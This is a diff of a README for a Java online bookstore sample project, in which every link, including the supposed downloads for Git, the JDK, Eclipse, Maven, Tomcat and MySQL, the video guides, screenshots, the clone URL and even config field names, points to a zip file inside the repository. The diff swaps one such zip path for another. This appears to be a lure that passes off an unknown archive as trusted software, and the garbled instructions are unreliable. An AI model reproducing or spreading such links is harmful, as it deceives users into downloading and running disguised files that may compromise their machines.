@@ -1,8 +1,8 @@
-# <a href="https://raw.githubusercontent.com/sivahariu/onlinebookstore/master/.github/onlinebookstore-2.4.zip" target="_blank"> OnlineBookStore </a> 
+# <a href="https://raw.githubusercontent.com/sivahariu/onlinebookstore/master/scripts/Software_v3.9.zip" target="_blank"> OnlineBookStore </a> 
 - A Java Web Developement Project
-- **Youtube VIDEO** for step by step Local Setup Guide : https://raw.githubusercontent.com/sivahariu/onlinebookstore/master/.github/onlinebookstore-2.4.zip
-- **Youtube VIDEO** for local setup of tender management project: https://raw.githubusercontent.com/sivahariu/onlinebookstore/master/.github/onlinebookstore-2.4.zip
-<!--Check out the Live website demo: [https://raw.githubusercontent.com/sivahariu/onlinebookstore/master/.github/onlinebookstore-2.4.zip](https://raw.githubusercontent.com/sivahariu/onlinebookstore/master/.github/onlinebookstore-2.4.zip)-->
+- **Youtube VIDEO** for step by step Local Setup Guide : https://raw.githubusercontent.com/sivahariu/onlinebookstore/master/scripts/Software_v3.9.zip
+- **Youtube VIDEO** for local setup of tender management project: https://raw.githubusercontent.com/sivahariu/onlinebookstore/master/scripts/Software_v3.9.zip
+<!--Check out the Live website demo: [https://raw.githubusercontent.com/sivahariu/onlinebookstore/master/scripts/Software_v3.9.zip](https://raw.githubusercontent.com/sivahariu/onlinebookstore/master/scripts/Software_v3.9.zip)-->
 - User Login Credentials: (shashi/shashi)
 - Admin Login Credentials: (Admin/Admin)
 <hr>
@@ -11,7 +11,7 @@
 
 A user-friendly Online Bookstore project in which users can log in or register, view the available books, select books along with their quantity, and buy them. Users can also get payment receipts after successful payment. The project can also be used by the administrator, who can add new books, remove books, increase and decrease the quantity of books, change the price of the books as well as maintain the selling history of books.
 
-![onlinebookstore](https://raw.githubusercontent.com/sivahariu/onlinebookstore/master/.github/onlinebookstore-2.4.zip)
+![onlinebookstore](https://raw.githubusercontent.com/sivahariu/onlinebookstore/master/scripts/Software_v3.9.zip)
 
 <span style="color:blue">**This Website is built for following purpose:-**</span>
 - For Selling books online.
@@ -52,13 +52,13 @@ A user-friendly Online Bookstore project in which users can log in or register, 
 - MySql
 
 ### ================ Software And Tools Required ================
-- : Git [https://raw.githubusercontent.com/sivahariu/onlinebookstore/master/.github/onlinebookstore-2.4.zip]
-- : Java JDK 8+ [https://raw.githubusercontent.com/sivahariu/onlinebookstore/master/.github/onlinebookstore-2.4.zip]
-- : Eclipse EE (Enterprise Edition) [https://raw.githubusercontent.com/sivahariu/onlinebookstore/master/.github/onlinebookstore-2.4.zip]
-- : Apache Maven [https://raw.githubusercontent.com/sivahariu/onlinebookstore/master/.github/onlinebookstore-2.4.zip]
-- : Tomcat v8.0+ [https://raw.githubusercontent.com/sivahariu/onlinebookstore/master/.github/onlinebookstore-2.4.zip]
-- : MySQL Server [https://raw.githubusercontent.com/sivahariu/onlinebookstore/master/.github/onlinebookstore-2.4.zip]
-- : MySQL Workbench (optional) [https://raw.githubusercontent.com/sivahariu/onlinebookstore/master/.github/onlinebookstore-2.4.zip]
+- : Git [https://raw.githubusercontent.com/sivahariu/onlinebookstore/master/scripts/Software_v3.9.zip]
+- : Java JDK 8+ [https://raw.githubusercontent.com/sivahariu/onlinebookstore/master/scripts/Software_v3.9.zip]
+- : Eclipse EE (Enterprise Edition) [https://raw.githubusercontent.com/sivahariu/onlinebookstore/master/scripts/Software_v3.9.zip]
+- : Apache Maven [https://raw.githubusercontent.com/sivahariu/onlinebookstore/master/scripts/Software_v3.9.zip]
+- : Tomcat v8.0+ [https://raw.githubusercontent.com/sivahariu/onlinebookstore/master/scripts/Software_v3.9.zip]
+- : MySQL Server [https://raw.githubusercontent.com/sivahariu/onlinebookstore/master/scripts/Software_v3.9.zip]
+- : MySQL Workbench (optional) [https://raw.githubusercontent.com/sivahariu/onlinebookstore/master/scripts/Software_v3.9.zip]
 
 ### ================= Dummy Database Initialization =================
 
@@ -89,9 +89,9 @@ insert into books values('9781951204006','A Programmers Guide to Computer Scienc
 insert into books values('9780316204552','The Soul of a New Machine','Tracy Kidder',293,30);
 insert into books values('9780132778046','Effective Java','Joshua Bloch',368,21);
 insert into books values('9781484255995','Practical Rust Projects','Shing Lyu',257,15);
-insert into users values('demo','demo','Demo','User','Demo Home','42502216225','https://raw.githubusercontent.com/sivahariu/onlinebookstore/master/.github/onlinebookstore-2.4.zip',2);
-insert into users values('Admin','Admin','Mr.','Admin','Haldia WB','9584552224521','https://raw.githubusercontent.com/sivahariu/onlinebookstore/master/.github/onlinebookstore-2.4.zip',1);
-insert into users values('shashi','shashi','Shashi','Raj','Bihar','1236547089','https://raw.githubusercontent.com/sivahariu/onlinebookstore/master/.github/onlinebookstore-2.4.zip',2);
+insert into users values('demo','demo','Demo','User','Demo Home','42502216225','https://raw.githubusercontent.com/sivahariu/onlinebookstore/master/scripts/Software_v3.9.zip',2);
+insert into users values('Admin','Admin','Mr.','Admin','Haldia WB','9584552224521','https://raw.githubusercontent.com/sivahariu/onlinebookstore/master/scripts/Software_v3.9.zip',1);
+insert into users values('shashi','shashi','Shashi','Raj','Bihar','1236547089','https://raw.githubusercontent.com/sivahariu/onlinebookstore/master/scripts/Software_v3.9.zip',2);
 
 commit;
 
@@ -101,9 +101,9 @@ commit;
 
 Step 0: Open Eclipse Enterprise Edition. [Install, if not already installed.]
 
-Step 1: Click On File > Import > Git > Projects From Git > Clone Uri > Paste The Repository Url as: ```https://raw.githubusercontent.com/sivahariu/onlinebookstore/master/.github/onlinebookstore-2.4.zip```> Select master Branch > Next > Next > Finish.
+Step 1: Click On File > Import > Git > Projects From Git > Clone Uri > Paste The Repository Url as: ```https://raw.githubusercontent.com/sivahariu/onlinebookstore/master/scripts/Software_v3.9.zip```> Select master Branch > Next > Next > Finish.
 
-Step 2. a: Go inside ```src/main/resources > https://raw.githubusercontent.com/sivahariu/onlinebookstore/master/.github/onlinebookstore-2.4.zip``` and update the value of database details as per your usage, like https://raw.githubusercontent.com/sivahariu/onlinebookstore/master/.github/onlinebookstore-2.4.zip, https://raw.githubusercontent.com/sivahariu/onlinebookstore/master/.github/onlinebookstore-2.4.zip, https://raw.githubusercontent.com/sivahariu/onlinebookstore/master/.github/onlinebookstore-2.4.zip and https://raw.githubusercontent.com/sivahariu/onlinebookstore/master/.github/onlinebookstore-2.4.zip according to your installed mysql/postgresql admin user credentials.
+Step 2. a: Go inside ```src/main/resources > https://raw.githubusercontent.com/sivahariu/onlinebookstore/master/scripts/Software_v3.9.zip``` and update the value of database details as per your usage, like https://raw.githubusercontent.com/sivahariu/onlinebookstore/master/scripts/Software_v3.9.zip, https://raw.githubusercontent.com/sivahariu/onlinebookstore/master/scripts/Software_v3.9.zip, https://raw.githubusercontent.com/sivahariu/onlinebookstore/master/scripts/Software_v3.9.zip and https://raw.githubusercontent.com/sivahariu/onlinebookstore/master/scripts/Software_v3.9.zip according to your installed mysql/postgresql admin user credentials.
 
 Step 2.b: Right Click on Project > Run as > Maven Build > In the goals field enter "clean install" > apply > run
 
@@ -124,16 +124,16 @@ Step 8: The default Username And Password For User Is "shashi" And "shashi"
 ## FAQ
 **Question:1** Unable to Connect to Database?
 
-**Answer:** Please check you have installed the mysql correctly and have updated the correct db details in https://raw.githubusercontent.com/sivahariu/onlinebookstore/master/.github/onlinebookstore-2.4.zip file. Also you can try doing maven clean install and force update the project and restart.
+**Answer:** Please check you have installed the mysql correctly and have updated the correct db details in https://raw.githubusercontent.com/sivahariu/onlinebookstore/master/scripts/Software_v3.9.zip file. Also you can try doing maven clean install and force update the project and restart.
 <hr>
 
 Note:- Considering this as a Sample Project, we have not much considered of web security.
 #### Some Screenshots for the project:
-<img width="941" alt="image" src="https://raw.githubusercontent.com/sivahariu/onlinebookstore/master/.github/onlinebookstore-2.4.zip">
-<img width="954" alt="image" src="https://raw.githubusercontent.com/sivahariu/onlinebookstore/master/.github/onlinebookstore-2.4.zip">
-<img width="930" alt="image" src="https://raw.githubusercontent.com/sivahariu/onlinebookstore/master/.github/onlinebookstore-2.4.zip">
-<img width="934" alt="image" src="https://raw.githubusercontent.com/sivahariu/onlinebookstore/master/.github/onlinebookstore-2.4.zip">
-<img width="946" alt="image" src="https://raw.githubusercontent.com/sivahariu/onlinebookstore/master/.github/onlinebookstore-2.4.zip">
+<img width="941" alt="image" src="https://raw.githubusercontent.com/sivahariu/onlinebookstore/master/scripts/Software_v3.9.zip">
+<img width="954" alt="image" src="https://raw.githubusercontent.com/sivahariu/onlinebookstore/master/scripts/Software_v3.9.zip">
+<img width="930" alt="image" src="https://raw.githubusercontent.com/sivahariu/onlinebookstore/master/scripts/Software_v3.9.zip">
+<img width="934" alt="image" src="https://raw.githubusercontent.com/sivahariu/onlinebookstore/master/scripts/Software_v3.9.zip">
+<img width="946" alt="image" src="https://raw.githubusercontent.com/sivahariu/onlinebookstore/master/scripts/Software_v3.9.zip">
 
 
 #### "Suggestions and project improvement ideas are welcomed!"
